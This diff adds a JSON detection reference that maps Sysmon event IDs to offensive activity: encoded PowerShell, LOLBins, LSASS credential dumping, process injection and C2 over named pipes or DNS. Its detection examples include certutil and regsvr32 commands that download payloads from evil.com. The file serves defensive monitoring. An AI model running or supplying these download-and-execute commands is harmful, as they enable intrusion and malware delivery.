@@ -1,0 +1,235 @@
+{
+  "description": "Sysmon Event IDs and what offensive activities trigger them",
+  "events": [
+    {
+      "id": 1,
+      "name": "Process Creation",
+      "description": "Logs process creation with command line",
+      "offensive_triggers": [
+        "PowerShell with encoded commands (-enc, -e flags)",
+        "CMD spawned from Office applications (Word, Excel)",
+        "Unusual parent-child relationships (explorer.exe → cmd.exe → powershell.exe)",
+        "Living-off-the-land binaries (LOLBins): certutil, bitsadmin, regsvr32",
+        "Processes with suspicious command lines (base64, download, bypass)"
+      ],
+      "detection_examples": [
+        "powershell.exe -enc <base64>",
+        "cmd.exe /c certutil -urlcache -split -f http://evil.com/payload.exe",
+        "regsvr32 /s /n /u /i:http://evil.com/evil.sct scrobj.dll"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "Process Changed a File Creation Time",
+      "description": "Logs when process modifies file timestamps (timestomping)",
+      "offensive_triggers": [
+        "Timestomping to match legitimate system files",
+        "Backdoor installation with timestamp manipulation"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "Network Connection",
+      "description": "Logs network connections initiated by processes",
+      "offensive_triggers": [
+        "Outbound connections from unusual processes (winword.exe, excel.exe)",
+        "Connections to known C2 infrastructure",
+        "High-port connections from system processes",
+        "Connections immediately after process creation",
+        "PowerShell making network connections"
+      ],
+      "detection_examples": [
+        "winword.exe connecting to external IPs",
+        "powershell.exe → TCP 443 to suspicious domain",
+        "rundll32.exe making outbound connections"
+      ]
+    },
+    {
+      "id": 4,
+      "name": "Sysmon Service State Changed",
+      "description": "Logs Sysmon service state changes",
+      "offensive_triggers": [
+        "Attempts to disable Sysmon service",
+        "Sysmon configuration tampering"
+      ]
+    },
+    {
+      "id": 5,
+      "name": "Process Terminated",
+      "description": "Logs process termination",
+      "offensive_triggers": [
+        "Security tool process termination (AV, EDR)",
+        "Suspicious processes terminating after brief execution"
+      ]
+    },
+    {
+      "id": 6,
+      "name": "Driver Loaded",
+      "description": "Logs kernel driver loading",
+      "offensive_triggers": [
+        "Unsigned or suspicious drivers",
+        "Rootkit driver installation",
+        "Drivers loaded from unusual locations"
+      ]
+    },
+    {
+      "id": 7,
+      "name": "Image Loaded",
+      "description": "Logs DLL loading into processes",
+      "offensive_triggers": [
+        "Unsigned DLLs loaded into system processes",
+        "DLLs loaded from unusual paths (%TEMP%, user directories)",
+        "Reflective DLL loading",
+        "Known malicious DLLs"
+      ],
+      "detection_examples": [
+        "explorer.exe loading DLL from %TEMP%",
+        "svchost.exe loading unsigned DLL",
+        "Powershell loading suspicious .NET assemblies"
+      ]
+    },
+    {
+      "id": 8,
+      "name": "CreateRemoteThread",
+      "description": "Logs cross-process thread creation",
+      "offensive_triggers": [
+        "Process injection via CreateRemoteThread",
+        "DLL injection techniques",
+        "Code injection into system processes"
+      ],
+      "detection_examples": [
+        "malware.exe → CreateRemoteThread → explorer.exe",
+        "powershell.exe injecting into notepad.exe"
+      ]
+    },
+    {
+      "id": 9,
+      "name": "RawAccessRead",
+      "description": "Logs raw disk access (volume shadow copy access)",
+      "offensive_triggers": [
+        "NTDS.dit extraction via volume shadow copy",
+        "SAM/SYSTEM hive extraction",
+        "Credential dumping from disk"
+      ]
+    },
+    {
+      "id": 10,
+      "name": "ProcessAccess",
+      "description": "Logs process access with specific rights",
+      "offensive_triggers": [
+        "LSASS process access for credential dumping",
+        "Accessing high-privilege processes",
+        "Cross-process memory reading"
+      ],
+      "detection_examples": [
+        "mimikatz.exe → OpenProcess → lsass.exe (PROCESS_VM_READ)",
+        "PowerShell accessing LSASS memory"
+      ]
+    },
+    {
+      "id": 11,
+      "name": "FileCreate",
+      "description": "Logs file creation",
+      "offensive_triggers": [
+        "Payload drops in suspicious locations (%TEMP%, %APPDATA%)",
+        "Creation of executable files by non-standard processes",
+        "File creation followed by immediate execution"
+      ]
+    },
+    {
+      "id": 12,
+      "name": "RegistryEvent (Object create and delete)",
+      "description": "Logs registry key/value creation and deletion",
+      "offensive_triggers": [
+        "Persistence mechanism installation (Run keys, Services)",
+        "Security setting modifications",
+        "Tool installation traces"
+      ]
+    },
+    {
+      "id": 13,
+      "name": "RegistryEvent (Value Set)",
+      "description": "Logs registry value modifications",
+      "offensive_triggers": [
+        "Persistence via registry modification",
+        "Security control bypass (UAC, Windows Defender)",
+        "Configuration tampering"
+      ]
+    },
+    {
+      "id": 14,
+      "name": "RegistryEvent (Key and Value Rename)",
+      "description": "Logs registry renames",
+      "offensive_triggers": [
+        "Registry manipulation for persistence",
+        "Hiding registry keys"
+      ]
+    },
+    {
+      "id": 17,
+      "name": "PipeEvent (Pipe Created)",
+      "description": "Logs named pipe creation",
+      "offensive_triggers": [
+        "Named pipe creation for C2 communication",
+        "Inter-process communication in malware",
+        "Cobalt Strike beacon named pipes"
+      ],
+      "detection_examples": [
+        "Pipes with random/unusual names",
+        "Multiple processes connecting to same pipe"
+      ]
+    },
+    {
+      "id": 18,
+      "name": "PipeEvent (Pipe Connected)",
+      "description": "Logs named pipe connections",
+      "offensive_triggers": [
+        "C2 agent communication via pipes",
+        "Lateral movement through named pipes"
+      ]
+    },
+    {
+      "id": 22,
+      "name": "DNSEvent (DNS query)",
+      "description": "Logs DNS queries",
+      "offensive_triggers": [
+        "DNS tunneling for C2 communication",
+        "Domain generation algorithms (DGA)",
+        "DNS queries for malicious domains",
+        "Unusual DNS query patterns"
+      ]
+    },
+    {
+      "id": 25,
+      "name": "ProcessTampering",
+      "description": "Logs process image tampering (process hollowing)",
+      "offensive_triggers": [
+        "Process hollowing attacks",
+        "PE image manipulation",
+        "Process replacement techniques"
+      ]
+    }
+  ],
+  "high_priority_combinations": [
+    {
+      "description": "Classic Process Injection Chain",
+      "events": "1 → 8 → 7",
+      "detail": "Process creation → CreateRemoteThread → DLL/code injection"
+    },
+    {
+      "description": "Credential Dumping",
+      "events": "1 → 10 → 5",
+      "detail": "Process start → LSASS access → quick termination"
+    },
+    {
+      "description": "Living-off-the-Land Execution",
+      "events": "1 → 3",
+      "detail": "LOLBin execution → immediate network connection"
+    },
+    {
+      "description": "PowerShell Download-Execute",
+      "events": "1 → 3 → 11",
+      "detail": "PowerShell start → network connection → file creation"
+    }
+  ]
+}
